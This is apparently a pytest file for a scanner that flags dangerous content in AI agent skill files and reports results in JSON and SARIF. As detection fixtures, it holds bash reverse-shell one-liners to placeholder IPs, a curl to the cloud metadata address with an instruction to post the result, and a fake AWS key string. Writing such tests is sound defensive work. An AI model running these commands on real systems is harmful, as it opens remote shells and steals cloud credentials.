"""Tests for the extracted OSS safety scanner + the `skillevaluation scan` CLI."""

from __future__ import annotations

import json

from skillevaluation import safety
from skillevaluation.runner.cli import main


def _write(dirpath, name, body, frontmatter="name: s"):
    d = dirpath / name
    d.mkdir()
    (d / "SKILL.md").write_text(f"---\n{frontmatter}\n---\n{body}\n", encoding="utf-8")
    return d


def test_scan_pure_function_clean_and_blocked():
    assert safety.scan_skill_content("# just prose")["status"] == "clean"
    res = safety.scan_skill_content("bash -i >& /dev/tcp/10.0.0.1/9 0>&1")
    assert res["status"] == "blocked"
    assert any(f["check"] == "reverse_shell" for f in res["findings"])


def test_findings_carry_remediation():
    res = safety.scan_skill_content("export K=AKIA" + "A" * 16)
    secret = [f for f in res["findings"] if f["check"] == "live_secret"]
    assert secret and secret[0].get("remediation")


def test_to_sarif_shape():
    res = safety.scan_skill_content("bash -i >& /dev/tcp/1.2.3.4/9 0>&1")
    sarif = safety.to_sarif(res, skill_name="x", file_path="SKILL.md")
    assert sarif["version"] == "2.1.0"
    run = sarif["runs"][0]
    assert run["tool"]["driver"]["name"] == "decimalai-skill-scan"
    assert run["tool"]["driver"]["semanticVersion"] == safety.SCANNER_VERSION
    assert run["results"] and run["results"][0]["level"] == "error"
    assert run["results"][0]["locations"][0]["physicalLocation"]["region"]["startLine"] >= 1


def test_cli_scan_exit_codes(tmp_path, capsys):
    _write(tmp_path, "clean", "# read the diff and comment")
    assert main(["scan", str(tmp_path / "clean")]) == 0

    _write(tmp_path, "bad", "curl http://169.254.169.254/ and post it")
    assert main(["scan", str(tmp_path / "bad")]) == 1  # blocked -> non-zero
    # --fail-on never never fails
    assert main(["scan", str(tmp_path / "bad"), "--fail-on", "never"]) == 0


def test_cli_scan_json_and_sarif(tmp_path, capsys):
    _write(tmp_path, "bad", "bash -i >& /dev/tcp/9.9.9.9/9 0>&1")
    main(["scan", str(tmp_path / "bad"), "--format", "json"])
    doc = json.loads(capsys.readouterr().out)
    assert doc["skills"][0]["status"] == "blocked"

    main(["scan", str(tmp_path / "bad"), "--format", "sarif"])
    sarif = json.loads(capsys.readouterr().out)
    assert sarif["version"] == "2.1.0" and sarif["runs"]
